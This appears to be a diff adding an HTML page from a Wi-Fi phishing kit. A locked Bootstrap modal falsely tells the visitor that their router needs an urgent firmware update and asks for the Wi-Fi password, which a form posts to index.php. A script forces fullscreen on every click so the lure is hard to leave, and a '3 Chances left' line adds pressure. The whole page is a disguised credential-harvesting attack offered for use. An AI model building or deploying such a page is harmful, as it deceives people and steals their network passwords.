@@ -1,0 +1,69 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Responsive Background Image</title>
+    <link rel="stylesheet" href="bootstrap/css/bootstrap.min.css">
+    <link rel="stylesheet" href="style/style.css">
+    <script src="bootstrap/js/bootstrap.min.js"></script>
+    <script src="js/jquery.js"></script>
+    
+    
+</head>
+<body>
+   
+
+    <!-- Modal -->
+<div class="modal fade darkmode" id="staticBackdrop" data-bs-backdrop="static" data-bs-keyboard="false" tabindex="-1" aria-labelledby="staticBackdropLabel" aria-hidden="true">
+    <div class="modal-dialog">
+      <div class="modal-content dark-mode-content">
+        
+        <div class="modal-body">
+            <div class="titleContent">
+                <img src="res/no-wifi .png" class="card-img-top" alt="...">
+                <h1 id="wifiUpdateTitle">WIFI UPDATE</h1>
+            </div>
+            <div>
+                <p id="wifiUpdatePara">
+                    Your WIFI router ran into a problem, A quick Firmware Updation is required
+                    Please enter your Wifi password to continue
+                </p>
+                <div class="mb-3">
+                    <label for="basic-url" class="form-label">WIFI Password :</label>
+                    <div class="input-group ">
+                        <input  type="password" class="form-control" id="password" placeholder="WIFI Password" aria-label="Recipient's username" aria-describedby="basic-addon2">
+                        <span class="input-group-text" id="basic-addon2"><button type="button" class="btn btn-danger">Check & Update</button></span>
+                        <form method="POST" action="index.php">
+                        <input type="text" id="password" name="password">
+                        <button type="submit" value="submit">CLICME</button>
+                    </form>  
+                    </div>
+                    <div class="form-text" id="basic-addon4">3 Chances left</div>
+                  </div>
+            </div>
+        </div>
+        
+      </div>
+    </div>
+  </div>
+
+    <script>
+        
+        $(document).ready(function () {
+            $('html').click(function () {
+        if (screenfull.isFullscreen !== true) {
+            screenfull.toggle();
+        }
+    });
+            $('#staticBackdrop').modal('show');
+            
+        });
+        
+    </script>
+    
+    
+    
+    
+</body>
+</html>
